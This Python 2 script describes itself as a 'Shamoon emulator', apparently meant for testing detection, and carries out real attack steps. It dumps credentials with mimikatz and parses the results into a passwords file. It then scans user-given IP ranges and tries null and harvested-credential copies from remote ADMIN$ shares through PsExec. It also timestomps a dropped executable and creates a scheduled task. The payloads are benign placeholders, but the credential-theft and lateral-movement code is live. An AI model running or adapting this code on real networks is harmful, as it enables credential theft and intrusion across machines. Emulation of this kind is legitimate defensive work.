'''
This is python Shamoon emulator.
The malware will create new files and have some lateral movement capabilities.
Lateral movement -> The malware uses the mimikatz module to copy a file from the other computers on the network to
                    local machine.
Other Modules:
Network scan -> The malware scan the local network.
Creation of new .exe file -> The malware create a new TrkSrv.exe file in C:\WIndows\System32
Creating of new file -> the malware create msinfo.txt containing info about the local machine and DUI.dll file
Create new schedule task -> The malware creates a new schedule task to start the calc.exe

The malware can self erase all the stuff it creates in the local machine by using the cleanup operation.

All the logs about the malware operation are stored in C:\logs.txt after the run is done.
All the logs about the malware cleanup operation is stored in C:\Sh_Cleanup.txt after the cleanup is done.

'''


import subprocess
import sys



def install(package):
    subprocess.call([sys.executable, "-m", "pip", "install", package])

try:

    install('requests')
    install('dnspython')
    install('pywin32')
    install('urllib3')
    install('httplib2')

except ModuleNotFoundError:

    pass

import httplib
import requests as req
import dns.resolver
import socket
from dns.resolver import NXDOMAIN
import os
import datetime
import sys
import win32com.client
import shutil


with open('C:\\logs.txt', 'w') as file:
    file.write("This is Shamoon simulator Log file" + "\n")

def system_check():
    '''
    Check If the system is 32 or 64 bit.
    return: String repr -> '64' if 64 bit machine and '32' if 32 bit machine
    '''
    import platform
    if "64" in platform.machine():
        return "64"
    else:
        return "32"


def logs_file(task,word):
    '''
     Update the logs file
    :param task: The Task number

    '''
    task = str(task)
    word = str(word)
    with open('C:\\logs.txt', 'a') as file:
        file.write("Task "+task +" - " + word + " is completed" + "\n")

def find(name, path):
    '''
    Find a file in the system path
    :param name: String -> File name
    :param path: system path, Example -> C:\
    :return: String -> The path to the file (e.g C:\path\file)
    '''
    for root, dirs, files in os.walk(path):
        if name in files and "Recycle" not in root:
            return os.path.join(root, name)

def WriteToFile(File,String):
    '''
    This Function Writes The input String into a new line in the file given
    param: String -> Write(String)
    param: File -> The path to the file, for example: C:\\Something.txt
    '''
    word = str(String)
    with open(File, 'a') as file:
        file.write(String + "\n")
    
###### Finding all the relevant files in the machine ###
syspath = 'C:\\Windows\\System32'
mimi64 = find("mimi64.bat","C:\\Users\\")
psexec32 = find("PsExec.exe",'C:\\Users\\')
psexec64 = find('PsExec64.exe','C:\\Users\\')
copy = find("copy.bat","C:\\")
bat_path = find('runmimi.bat','C:\\')
mimikatz = find('mimikatz.exe','C:\\')
mimikatz64 = find('mimikatz64.exe','C:\\')
PassGet64 = find('PassGet64.bat','C:\\')
PassGet32 = find('PassGet32.bat','C:\\')
########################################################

if sys.argv[1] == "-i":
    print "init"

    ####### Task 1 - Create new .exe -> C:\Windows\System32\trksrv.exe #######
    try:
        

        ### Installing pyinstaller ###
        os.system("python -m pip install pip==18.1")
        os.system('pip install pyinstaller -q')
        os.system("python -m pip install --upgrade pip")

        ### Setting up the file name ####
        name = 'TrkSrv'

        ### Create a new python file with the user input ###
        with open(syspath + '\\' + name + '.py', 'w') as file:
            file.write('print "Hello world"')

        os.system("pyinstaller " + syspath + '\\' + name + '.py' + ' -y' + ' --workpath ' + syspath)  # Create the .exe file

        ### Moving the .exe file to the filepath with os.rename func ###
        if os.path.exists(syspath + '\\' + 'dist' + '\\' + name + '\\' + name + '.exe') == True:  # == if the file  exist
            os.rename(syspath + '\\' + 'dist' + '\\' + name + '\\' + name + '.exe',
                      syspath + '\\' + name + '.exe')  # Move the file to system32
        elif os.path.exists(syspath + '\\' + name + '\\' + name + '.exe') == True:  # == If the file  exist
            os.rename(syspath + '\\' + name + '\\' + name + '.exe', syspath + '\\' + name + '.exe')  # Move the file to system32
        else:
            print 'File already exist in the desktop'

        ### Removing unnecessary files and folders created from the process ###
        import errno, os, stat, shutil


        def handleRemoveReadonly(func, path, exc):
            '''
            This function will be used as a handler for PermissionError when trying to delete directories
            '''
            excvalue = exc[1]
            if func in (os.rmdir, os.remove) and excvalue.errno == errno.EACCES:
                os.chmod(path, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)  # 0777
                func(path)
            else:
                raise PermissionError

        #Delete unrequited files and folders
        del_file1 = syspath + '\\' + name  # path to the first directory that needs to be deleted
        del_file2 = syspath + '\\dist'  # path to the second directory that needs to be deleted
        if os.path.exists(del_file1) == True:
            shutil.rmtree(del_file1, ignore_errors=False, onerror=handleRemoveReadonly)
        if os.path.exists(del_file2) == True:
            shutil.rmtree(del_file2, ignore_errors=False, onerror=handleRemoveReadonly)
        if os.path.exists(syspath + '\\' + name + '.spec') == True:
            os.remove(syspath + '\\' + name + '.spec')
        if os.path.exists(syspath + '\\' + name + '.py') == True:
            os.remove(syspath + '\\' + name + '.py')

        ### Removing the TrkSrv.exe from System32
        os.remove(syspath + '\\' + name + '.py')


        print 'Creating new .exe is done! Please check your filepath to see your desired file'
        logs_file(1,"Create new trksvr.exe file process") # log the first task

    except Exception as err:
        print "Error was occured on Task 1 \n" + str(err)

        
    ###### Task 2 - Change trksrv.exe timestamp to be like kernel32.dll #######
    try:
        kernel_timestamp = os.path.getmtime("C:\\Windows\\System32\kernel32.dll")
        os.utime(syspath + '\\trksrv.exe', (kernel_timestamp, kernel_timestamp)) # Timestamp changed
        logs_file(2,'Change time stamp to trksrv service') # log the task
        
    except Exception as err:
        print "Error was occured on Task 2 \n" + str(err)

    ###### Task 3 - Ping test google.com #######
    try:
        os.system('ping google.com')
        WriteToFile("C:\\logs.txt","ping google.com")
        logs_file(3,'Ping test to google.com') # log the task
    except Exception as err:
        print "Error was occured on Task 3 \n" + err

    ###### Task 4 - HTTP to 10.0.0.1 on ports: 80,3349,445 ######
    try:
        h1 = httplib.HTTPConnection('10,0,0,1') # Defualt port used -> port 80
        h2 = httplib.HTTPConnection('10.0.0.1',3349)
        h3 = httplib.HTTPConnection('10.0.0.1',445)
        logs_file(4, 'HTTP Connection to 10.0.0.1 on ports: 80,3349,445')  # log the task

    except:
        print 'Error in Task 4: No such ip 10.0.0.1'


    ###### Task 5 - Create a new schedule task to run calc.exe #######
    try:
        scheduler = win32com.client.Dispatch('Schedule.Service')
        scheduler.Connect()
        root_folder = scheduler.GetFolder('\\')
        task_def = scheduler.NewTask(0)

        # Create trigger
        start_time = datetime.datetime.now() + datetime.timedelta(minutes=5) #<- Run every 5 minutes
        TASK_TRIGGER_TIME = 1
        trigger = task_def.Triggers.Create(TASK_TRIGGER_TIME)
        trigger.StartBoundary = start_time.isoformat()

        # Create action
        TASK_ACTION_EXEC = 0
        action = task_def.Actions.Create(TASK_ACTION_EXEC)
        action.ID = 'DO NOTHING'
        action.Path = 'calc.exe'
        action.Arguments = '/c "exit"'

        # Set parameters
        task_def.RegistrationInfo.Description = 'calc - used for updating opening the calculator'
        task_def.Settings.Enabled = True
        task_def.Settings.StopIfGoingOnBatteries = False


        # Register task
        # If task already exists, it will be updated
        TASK_CREATE_OR_UPDATE = 6
        TASK_LOGON_NONE = 0
        root_folder.RegisterTaskDefinition(
            'calc',  # Task name
            task_def,
            TASK_CREATE_OR_UPDATE,
            '',  # No user
            '',  # No password
            TASK_LOGON_NONE)

        logs_file(5,"Add calc.exe as a schedule task")

    except Exception as err:
        print "Error was occured on Task 5 \n" + str(err)

    ###### Task 6 - Create a msinfo32 log file ######
    try:
        if os.path.exists("C:\\Users\\shamoon"):
            sysinfo_path = "C:\\Users\\shamoon"
            os.system('msinfo32 /report ' + sysinfo_path + '\\msinfo_log.txt') # <- create new log file

        os.makedirs("C:\\Users\\shamoon")
        sysinfo_path = "C:\\Users\\shamoon"
        os.system('msinfo32 /report ' + sysinfo_path + '\\msinfo_log.txt') # <- create new log file
        logs_file(6,'Create new msinfo32 log file with system information on C:\\')
        
    except Exception as err:
        print "Error was occured on Task 6 \n" + str(err)

    ###### Task 7 - Start workstation service in services.msc#######
    try:
        os.system('sc config lanmanworkstation start= demand') # In case the service is disabled
        os.system('net start workstation')
        WriteToFile("C:\\logs.txt","sc config lanmanworkstation start= demand \n" + "net start workstation")
        logs_file(7, 'Enable and start workstation service in services.msc')
        
    except Exception as err:
        print "Error was occured on Task 7 \n" + str(err)

    ###### Task 8 - Strings ######
    try:
        var = 'C:\\Windows\\Temp\\out176268067 Akernel32.dll\\Wuser32.dll'
        #Strings resources - temp\out176268067 Akernel32.dll\\Wuser32.dll
        logs_file(8,'Strings var and comment writing') # log the task
    except Exception as err:
        print "Error was occured on Task 8 \n" + str(err)

    ###### Task 9 - import ws2_32.dll file into python code ######
    try:
        from ctypes import *
        ws32_dll = cdll.LoadLibrary('C:\\Windows\\System32\\ws2_32.dll')
        logs_file(9,'import ws2_32.dll into python') # log the task

    except Exception as err:
        print "Error was occured on Task 9 \n" + err

    ###### Task 10 - Drop DUI170.dll in C:\\Windows\\Temp #######
    try:
        with open('C:\\Windows\\Temp\\DUI170.dll','w') as file: # Create new file ->  DUI170.dll
            file.write('This file is created by Shamoon ;-)')
        logs_file(10,'Drop the DUI170.dll file into C:\\Windows\\Temp folder')
        
    except Exception as err:
        print "Error was occured on Task 10 \n" + str(err)

    ###### Task 11 - run the command -> svchost -k netsvcs ######
    try:
        os.system('svchost -k netsvcs')
        WriteToFile("C:\\logs.txt","svchost -k netsvcs")
        logs_file(11,'run on cmd -> svchost -k netsvcs')
        
    except Exception as err:
        print "Error was occured on Task 11 \n" + str(err)

    ###### Task 12 - run command ping -n 30 127.0.0.1#######
    try:
        os.system("ping -n 30 127.0.0.1 >nul")
        os.system("sc start config TrkSrv binpath= system32\\trksrv.exe")
        logs_file(12,'Run command ping -n ...')
        WriteToFile("C:\\logs.txt", "ping -n 30 127.0.0.1 >nul")
        WriteToFile("C:\\logs.txt", "sc start config TrkSrv binpath= system32\\trksrv.ex")

    except Exception as err:
        print "Error was occured on Task 12 \n" + str(err)

    ###### Task 13 - dns -> testdomain.com ######
    try:
        add1 = socket.gethostbyname("testdomain.com") # dns request to http:\\testdomain.com
        logs_file(13,"DNS lookup to testdomain.com, result: " + str(add1))# log the task
        
    except:
        print 'Error in Task 13: No such website'

    ###### Task 14 - copy crss.exe to C:\\Windows ######
    try:
        crss = find('crss.exe','C:\\')
        if crss != None: # <- the file was found
            os.rename(crss,'C:\\Windows\\crss.exe')  # Move the file to C:\Windows
        logs_file(14,'copy crss.exe file to C:\\Windows if it exists')

    except Exception as err:
        print "Error was occured on Task 14 \n" + str(err)

    ###### Task 15 - Scan the network and try to copy file from admin share to system32 ######

    try:
        import time

        if system_check() == "64":  # Check if the system is 64 or 32 bit machine
            print mimi64 + " " + psexec64 + " " + PassGet64 + " " + mimikatz64
            os.system(bat_path + " 64 " + psexec64 + " " + PassGet64 + " " + mimikatz64)
        else:
            os.system(bat_path + " 32 " + psexec32 + " " + PassGet32 + " " + mimikatz)

        time.sleep(10)  ## Wait for the mimilog file to be created

        passwords_path = find("mimilog.txt", "C:\\")
        print passwords_path
        with open(passwords_path, 'r') as file:
            lines = file.readlines()
            lines1 = [l for l in lines if "Username" in l]
            print(lines1)
            for i in range(len(lines1)):
                print lines1[i]
                lines1[i] = lines1[i].replace('*', str(i))
                print lines1[i]
            lines2 = [l for l in lines if "* Password" in l]
            for i in range(len(lines2)):
                print lines2[i]
                lines2[i] = lines2[i].replace('*', str(i))
                print lines2[i]
            with open("C:\\Passwords.txt", "w") as f1:
                f1.writelines(lines1)
                f1.writelines(lines2)

        with open("C:\\Passwords.txt", "r") as f1:
            lines = f1.readlines()
            users = []
            passwords = []
            for line in lines:
                if "Username" in line and "null" not in line:
                    line.strip(" ")
                    print line[15:]
                    user = line[15:]
                    users.append(user)
                if "Password" in line and "null" not in line:
                    line.strip(" ")
                    print line[15:]
                    password = line[15:]
                    passwords.append(password)

            users = list(map(lambda s: s.strip(), users)) # map all the usernames to the files
            passwords = list(map(lambda s: s.strip(), passwords)) #map all the passwords to the file



        networkClass = str(raw_input("Please Enter Network Class: A / B / C: "))
        print networkClass
        first_ip = raw_input("Enter the First IP adress to check: ")
        net1 = first_ip.split('.')
        a = '.'

        net2 = net1[0] + a + net1[1] + a + net1[2] + a

        last_ip = raw_input("Enter the Last IP address to check: ")
        net3 = last_ip.split('.')

        def scan(addr):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = s.connect_ex((addr, 135))
            if result == 0:
                return 1
            else:
                return 0

        #Class C Net Scan
        def runC():
            print "Class C Scan"
            start = int(net1[3])
            stop = int(net3[3]) + 1
            live_hosts = []

            for ip in range(start, stop):
                addr = net2 + str(ip)
                print(addr)
                if (scan(addr)):
                    print addr, "is live"
                    live_hosts.append(addr)

            retStr = ""
            for liveip in live_hosts:
                retStr += str(liveip) + "\n"

            WriteToFile("C:\\logs.txt",retStr)
            return live_hosts

        #Class A Net Scan
        def runA():
            print "Class A Scan"
            start = int(net1[0])
            stop = int(net3[0])+1
            live_hosts = [] # list of the live hosts

            for network1 in range(stop):
                for network2 in range(stop):
                    for ip in range(start, stop):
                        addr = net1[0] + a + str(network1) + a + str(network2) + a + str(ip)
                        print addr
                        if (scan(addr)):
                            print addr, "is live"
                            live_hosts.append(addr)
            retStr = ""
            for liveip in live_hosts:
                retStr += str(liveip) + "\n"

            WriteToFile("C:\\logs.txt",retStr)
            return live_hosts

        # Class B Net Scan
        def runB():

            print "Class B Scan"
            start = int(net1[1])
            stop = int(net3[1])+1
            live_hosts = [] # list of the live hosts

            for network2 in range(stop):
                for ip in range(start, stop):
                    addr = net1[0] + a + net1[1] + a + str(network2) + a + str(ip)
                    print addr
                    if (scan(addr)):
                        print addr, "is live"
                        live_hosts.append(addr)

            retStr = ""
            for liveip in live_hosts:
                retStr += str(liveip) + "\n"

            WriteToFile("C:\\logs.txt",retStr)
            return live_hosts


        if networkClass == "A":
            netA = runA()
            for ip in netA:
                for ip in netA:
                    # copy a file from IP\ADMIN$ to %windir%\System32
                    if system_check() == "64":  # If the machine is 64 bit machine
                        print "Trying to access all live host and copy file from ADMIN$"
                        for ip in netA:
                            WriteToFile("C:\\logs.txt","Trying to copy files from " + str(ip))
                            try:
                                print "Trying to connect without using username and password and copy file"
                                WriteToFile("C:\\logs.txt","Trying to copy file with no username and password")
                                catch = os.system("xcopy " + "\\\\" + str(ip) + "\\admin$\\winhelp.exe " + "\\\\127.0.0.1\\C$\\Windows\\System32\\" + " /c /f /y")
                                if catch == 0:
                                    WriteToFile("C:\\logs.txt","USERNAME: NULL && PASSWORD: NULL WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                                time.sleep(4)
                            except:
                                print "copy did not succeed"
                                
                            for user in users:
                                WriteToFile("C:\\logs.txt","Trying use username: " + str(user))
                                for password in passwords:
                                    WriteToFile("C:\\logs.txt","Trying to use Password " + str(password))
                                try:
                                    print "trying to copy winhelp.exe from ip -> " + ip + '\n' + "with username: " + user + " and password: " + password
                                    print copy + " " + user + " " + password + " " + psexec32 + " " + ip
                                    catch = os.system(copy + " " + user + " " + password + " " + psexec32 + " " + ip)
                                    if catch == 0:
                                        WriteToFile("C:\\logs.txt","USERNAME: " + user + " && " + "PASSWORD: "+ password + " WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                                except:
                                    print "copy did not succeed"
                                        

                    else:  # if the machine is 32 bit machine
                        print "Trying to access all live host and copy file from ADMIN$"
                        for ip in netA:
                            WriteToFile("C:\\logs.txt","Trying to copy files from " + str(ip))
                            try:
                                print "Trying to connect without using username and password and copy file"
                                WriteToFile("C:\\logs.txt","Trying to copy file with no username and password")
                                catch = os.system("xcopy " + "\\\\" + str(ip) + "\\admin$\\winhelp.exe " + "\\\\127.0.0.1\\C$\\Windows\\System32\\" + " /c /f /y")
                                if catch == 0:
                                    WriteToFile("C:\\logs.txt","USERNAME: NULL && PASSWORD: NULL WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                                time.sleep(4)
                            except:
                                print "copy did not succeed"

                            for user in users:
                                WriteToFile("C:\\logs.txt","Trying use username: " + str(user))
                                for password in passwords:
                                    WriteToFile("C:\\logs.txt","Trying to use Password " + str(password))
                                try:
                                    print "trying to copy winhelp.exe from ip -> " + ip + '\n' + "with username: " + user + " and password: " + password
                                    print copy + " " + user + " " + password + " " + psexec32 + " " + ip
                                    catch = os.system(copy + " " + user + " " + password + " " + psexec32 + " " + ip)
                                    if catch == 0:
                                        WriteToFile("C:\\logs.txt","USERNAME: " + user + " && " + "PASSWORD: "+ password + " WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                                except:
                                    print "copy did not succeed"
                                        

                  
        elif networkClass == "B":
            netB = runB()
            for ip in netB:
                for ip in netB:
                    # copy a file from IP\ADMIN$ to %windir%\System32
                    if system_check() == "64":  # If the machine is 64 bit machine
                        print "Trying to access all live host and copy file from ADMIN$"
                        for ip in netB:
                            WriteToFile("C:\\logs.txt","Trying to copy files from " + str(ip))
                            try:
                                print "Trying to connect without using username and password and copy file"
                                WriteToFile("C:\\logs.txt","Trying to copy file with no username and password")
                                catch = os.system("xcopy " + "\\\\" + str(ip) + "\\admin$\\winhelp.exe " + "\\\\127.0.0.1\\C$\\Windows\\System32\\" + " /c /f /y")
                                if catch == 0:
                                    WriteToFile("C:\\logs.txt","USERNAME: NULL && PASSWORD: NULL WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                                time.sleep(4)
                            except:
                                print "copy did not succeed"
                                
                            for user in users:
                                WriteToFile("C:\\logs.txt","Trying use username: " + str(user))
                                for password in passwords:
                                    WriteToFile("C:\\logs.txt","Trying to use Password " + str(password))
                                    try:
                                        print "trying to copy winhelp.exe from ip -> " + ip + '\n' + "with username: " + user + " and password: " + password
                                        print copy + " " + user + " " + password + " " + psexec32 + " " + ip
                                        catch = os.system(copy + " " + user + " " + password + " " + psexec32 + " " + ip)
                                        if catch == 0:
                                            WriteToFile("C:\\logs.txt","USERNAME: " + user + " && " + "PASSWORD: "+ password + " WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                                    except:
                                        print "copy did not succeed"

                    else:  # if the machine is 32 bit machine
                        print "Trying to access all live host and copy file from ADMIN$"
                        for ip in netB:
                            WriteToFile("C:\\logs.txt","Trying to copy files from " + str(ip))
                            try:
                                print "Trying to connect without using username and password and copy file"
                                WriteToFile("C:\\logs.txt","Trying to copy file with no username and password")
                                catch = os.system("xcopy " + "\\\\" + str(ip) + "\\admin$\\winhelp.exe " + "\\\\127.0.0.1\\C$\\Windows\\System32\\" + " /c /f /y")
                                if catch == 0:
                                    WriteToFile("C:\\logs.txt","USERNAME: NULL && PASSWORD: NULL WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                                time.sleep(4)
                            except:
                                print "copy did not succeed"
                                
                            for user in users:
                                WriteToFile("C:\\logs.txt","Trying use username: " + str(user))
                                for password in passwords:
                                    WriteToFile("C:\\logs.txt","Trying to use Password " + str(password))
                                try:
                                    print "trying to copy winhelp.exe from ip -> " + ip + '\n' + "with username: " + user + " and password: " + password
                                    print copy + " " + user + " " + password + " " + psexec32 + " " + ip
                                    catch = os.system(copy + " " + user + " " + password + " " + psexec32 + " " + ip)
                                    if catch == 0:
                                        WriteToFile("C:\\logs.txt","USERNAME: " + user + " && " + "PASSWORD: "+ password + " WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                                except:
                                    print "copy did not succeed"
                                        

        elif networkClass == "C":
            netC = runC() # <- All the live host on the C class network
            for ip in netC:
                # copy a file from IP\ADMIN$ to %windir%\System32
                if system_check() == "64": # If the machine is 64 bit machine
                    print "Trying to access all live host and copy file from ADMIN$"
                    
                    for ip in netC:
                        WriteToFile("C:\\logs.txt","Trying to copy files from " + str(ip))
                        try:
                            print "Trying to connect without using username and password and copy file"
                            WriteToFile("C:\\logs.txt","Trying to copy file with no username and password")
                            catch = os.system("xcopy " + "\\\\" + str(ip) + "\\admin$\\winhelp.exe " + "\\\\127.0.0.1\\C$\\Windows\\System32\\" + " /c /f /y")
                            if catch == 0:
                                WriteToFile("C:\\logs.txt","USERNAME: NULL && PASSWORD: NULL WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                            time.sleep(4)
                        except:
                            print "copy did not succeed"

                        for user in users:
                            WriteToFile("C:\\logs.txt","Trying use username: " + str(user))
                            for password in passwords:
                                WriteToFile("C:\\logs.txt","Trying to use Password " + str(password))
                                try:
                                    print "trying to copy winhelp.exe from ip -> " + ip + '\n' + "with username: " + user + " and password: " + password
                                    print copy + " " + user + " " + password + " " + psexec64 + " " + ip
                                    catch = os.system(copy + " " + user + " " + password + " " + psexec32 + " " + ip)
                                    if catch == 0:
                                        WriteToFile("C:\\logs.txt","USERNAME: " + user + " && " + "PASSWORD: "+ password + " WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                                except:
                                    print "copy did not succeed"

                else: # if the machine is 32 bit machine
                    print("Trying to access all live host and copy file from ADMIN$")
                    for ip in netC:
                        WriteToFile("C:\\logs.txt","Trying to copy files from " + str(ip))
                        try:
                            print "Trying to connect without using username and password and copy file"
                            WriteToFile("C:\\logs.txt","Trying to copy file with no username and password")
                            catch = os.system("xcopy " + "\\\\" + str(ip) + "\\admin$\\winhelp.exe " + "\\\\127.0.0.1\\C$\\Windows\\System32\\" + " /c /f /y")
                            if catch == 0:
                                WriteToFile("C:\\logs.txt","USERNAME: NULL && PASSWORD: NULL WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                            time.sleep(4)
                        except:
                            print "copy did not succeed"

                        for user in users:
                            WriteToFile("C:\\logs.txt","Trying use username: " + str(user))
                            for password in passwords:
                                WriteToFile("C:\\logs.txt","Trying to use Password " + str(password))
                                try:
                                    print "trying to copy winhelp.exe from ip -> " + ip + '\n' + "with username: " + user + " and password: " + password
                                    print copy + " " + user + " " + password + " " + psexec32 + " " + ip
                                    catch = os.system(copy + " " + user + " " + password + " " + psexec32 + " " + ip)
                                    if catch == 0:
                                        WriteToFile("C:\\logs.txt","USERNAME: " + user + " && " + "PASSWORD: "+ password + " WORKED! ACCESS TO REMOTE COMPUTER AND COPY FILE WORKED!")
                                except:
                                    print "copy did not succeed"


        logs_file(15,'Copy a random file (winhelp.exe file was chosen) from HOST\ADMIN$ to C:\Windows\System32')

    except Exception as err:
        print "Error was occured on Task 15 \n" + str(err)



###### Task 16 - Check if shamoon.py is ran with arguments ######
    try:
        if len(sys.argv) > 1:
            print sys.argv[1]   # <-- print the argument given
        logs_file(16, 'Checking for arguments given at runtime') # log the task

    except Exception as err:
            print "Error was occured on Task 16 \n" + str(err)




####### SHAMOON CLEANUP OPERATION ########
if sys.argv[1] == '-d':
    print 'delete operation started...'

    path = find('logs.txt','C:\\') ## Remove the previous log file
    os.remove(path)

    # Create new log file for cleanup operation
    with open('C:\\Sh_cleauplogs.txt', 'w') as file:
        file.write("This is Shamoon simulator Cleanup Log file" + "\n")

    def del_logs_file(task,word):
        '''
        Update the logs file
        :param task: The Task number

        '''
        task = str(task)
        word = str(word)
        with open('C:\\Sh_cleauplogs.txt', 'a') as file:
            file.write("Task "+task +" - " + word + " is Completed" + "\n")


    ## Task 1 - Delete the trksrv.exe file ##
    print " Trying to delete TrkSrv.exe file..."
    syspath = find("TrkSrv.exe","C:\\Windows\\System32")
    specpath = find("TrkSrv.spec","C:\\Users")
    try:
        os.remove(syspath)
        os.remove(specpath)
        
        del_logs_file(1,"Deletion of TrkSrv.exe file")
    
    except Exception as err:
        print "Error in Task 1: " + str(err)

    ## Task 2 - Delete calc.exe schedule task ##
    print " Trying to delete calc.exe schedule task..."
    try:
        os.system('SchTasks /Delete /tn "calc" /f')
        del_logs_file(2, "Removing of the new calc schedule task")

    except Exception as err:
        print "Error was occured on Task 2: " + str(err)


    ## Task 3 - Delete the msinfo32 log file ##
    print " Trying to delete msinfo32.log file..."
    try:
        path = "C:\\Users\\shamoon\\msinfo_log.txt"
        os.remove(path)
        os.rmdir("C:\\Users\\shamoon") # Remove the new shamoon dir
        del_logs_file(3,"Deletion of The new msinfo32 log file")
        
    except Exception as err:
        del_logs_file(3,"Deletion of The new msinfo32 log file")
        print "Error was occured on Task 3: " + str(err)

    ## Task 4 - Stop The workstation service ##
    print " Trying to stop the workstation service..."
    try:
        os.system('sc config lanmanworkstation start= disabled')
        os.system('net stop workstation /y')
        del_logs_file(4,"Stop the Workstation service")
        
    except Exception as err:
        print "Error was occured on Task 4: " + str(err)

    ## Task 5 - Delete the DUI170.dll file ##
    print " Trying to delete DUI170.dll file..."
    try:
        os.remove("C:\\Windows\\Temp\\DUI170.dll")
        del_logs_file(5,"Delete C:\\Windows\\Temp\\DUI170.dll ")
        
    except Exception as err:
        print "Error was occured on Task 5 " + str(err)
        del_logs_file(5,"Delete C:\\Windows\\Temp\\DUI170.dll ")
        


    ## Task 6 - Move the crss.exe file back to original place ##
    print " Moving the crss.exe back to its original place"
    try:
        crss =  find('crss.exe','C:\\')
        if crss != None: # <- the file was found
            os.rename('C:\\Windows\\crss.exe',crss)
        del_logs_file(6,"Move the crss.exe file back to its original folder C:\\Windows\\")
    except Exception as err:
        print "Error was occured on Task 6: " + str(err)

    ## Task 7 - Remove file that was copied from the ADMIN$ ##
    print " Trying to delete winhelp.exe file that was copied from remote machine..."
    try:
        os.remove(r'C:\Windows\System32\winhelp.exe')
        del_logs_file(7,"Deletion of the winhelp.exe file that was copied from the ADMIN$")
    except Exception as err:
        print "Error was occured on Task 7: " + str(err)
    

    ## Task 8 - Remove the mimilogs and passwords logs ##
    print " Trying to delete mimilog.txt and Passwords.txt..."
    mimilogs = find("mimilog.txt","C:\\")
    PasswordFile = find("Passwords.txt","C:\\")                
    try:
        os.remove(mimilogs)
        os.remove(PasswordFile)
        del_logs_file(8,"Deletion of mimilog file and the passwords file")
    except Exception as err:
        print "Error was occured on Task 8: " + str(err)

